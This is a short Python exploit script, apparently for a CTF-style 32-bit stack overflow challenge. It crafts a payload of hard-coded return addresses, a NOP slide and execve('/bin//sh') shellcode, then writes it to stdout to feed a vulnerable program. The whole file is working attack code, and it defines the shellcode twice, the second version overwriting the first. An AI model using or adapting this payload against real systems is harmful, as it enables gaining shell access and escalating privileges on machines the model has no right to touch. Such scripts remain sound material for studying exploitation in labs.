import sys
import os
import struct

offset = struct.pack('I', 0x804854b) * 20

# address of p() ret instruction -> 0x804854b
ret = struct.pack('I', 0x804854b)

# address of the shellcode =
#   address after the payload and the p() ret instruction -> 0xbffff644
shellcode_addr = struct.pack('I', 0xbffff644 + 4)

ill = "\x0f\x0b"

nopslide = "\x90" * 32 + ill

shellcode = struct.pack('I', 0x6850c031) + \
            struct.pack('I', 0x68732f2f) + \
            struct.pack('I', 0x69622f68) + \
            struct.pack('I', 0x50e3896e) + \
            struct.pack('I', 0xb0e18953) + \
            struct.pack('I', 0x9080cd0d) # starts by 0x90 for the nopslide, segfaults otherwise

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = ret + shellcode_addr + nopslide + shellcode + ill + nopslide

from sys import stdout

stdout.write(offset + payload)
stdout.flush()

# os.system('cat')